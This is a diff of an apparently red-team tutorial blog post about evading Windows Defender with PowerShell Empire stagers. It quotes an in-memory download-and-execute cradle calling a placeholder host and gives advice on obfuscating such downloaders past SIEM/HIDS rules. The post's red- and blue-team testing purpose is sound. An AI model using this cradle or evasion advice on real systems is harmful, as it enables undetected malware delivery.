@@ -99,14 +99,14 @@ It is well known that some powershell arguments were abused in the last years. I
  <li>encodedcommand – indicates the following chunk of text is a base64 encoded command.</li> 
  </ul>
 
-The Empire's stager (multi/launcher) is coming with the 'encodedcommand' command as enabled by default. Besides this, the empire's listeners (HTTP listener) is using all of the above arguments as part of the launcher syntax. When they are used together, most likely there is something suspicious. Use only 'noninteractive' or '-windowsstyle hidden' if it is needed.
+The Empire's stager (multi/launcher) is coming with the 'encodedcommand' command as enabled by default. Besides this, the empire's listeners (HTTP listener) use all of the arguments provided above as part of the launcher syntax. When they are used together, most likely there is something suspicious. Use only 'noninteractive' or '-windowsstyle hidden' if it is needed.
 
 <div>
 <center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/launcher.png">
  </center>
 </div>
 
-I recommend to turn base64 off. It doesn't add anything to your obfuscation while trying to avoid Defender. It's really just used because it's the easiest way to handle sending the command in a string. Once you have your obfuscated code you can re-encode it if you really want to use this method. <br/>
+I recommend to turn base64 off. It doesn't add anything to your obfuscation while trying to avoid Defender. It's just used because it's the easiest way to handle sending the command in a string. Once you have your obfuscated code you can re-encode it if you really want to use this method. <br/>
 Most security related solutions created features for detecting base64 encoded strings and analyzing them after the content is decoded. CarbonBlack, FireEye made public their sollutions' capabilities in the past, being clear for us that the above arguments are using as a part of their detection rules: you can read more <a href="https://www.carbonblack.com/2015/08/14/how-to-detect-powershell-empire-with-carbon-black/" style="text-decoration: none;">here</a> and <a href="https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html" style="text-decoration: none;">here</a>.  
 
 <br/><br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's talk about the dropper before starting with the demo.
@@ -115,7 +115,7 @@ Most security related solutions created features for detecting base64 encoded st
 Possibly many of you use the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings like "new-object", "Webclient", "downloadstring" are used by many for detecting suspicious events. I will make use of an open source <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> made special for this kind of tasks.<br/>
 Invoke-CradleCafter is a tool special created for automating the process for making obfuscated downloaders in memory or on disk. 
 
-I am using the only in memory downloader. I invite you to take a look on it in case you are interested in using it. If you are a blue teamer, you may be interested in testing your detection capabilities of your SIEM/HIDS with Invoke-CradleCafter.
+In my example I am using "MEMORY\PSCOMPILEDCSHARP\INVOKE\10". I invite you to take a look on it in case you are interested in using it. If you are a blue teamer, you may be interested in testing your detection capabilities of your SIEM/HIDS with Invoke-CradleCafter.
 <br/> I can also obfuscate more the dropper with Invoke-Obfuscation, for escaping the most exotic SIEM/HIDS rules but I am not doing it this time. 
 
 <div>
@@ -123,7 +123,7 @@ I am using the only in memory downloader. I invite you to take a look on it in c
  </center>
 </div>
 
-<br/> Now it is the time for what you all wanting to see.
+<br/> Now it is the time for what all of you wanted to see.
 
 ### Demo <br/>
 My tests are done on an up-to-date Windows Pro OS with Windows Defender enabled. (all of the updates were done before filming the video - 21 April 2020).
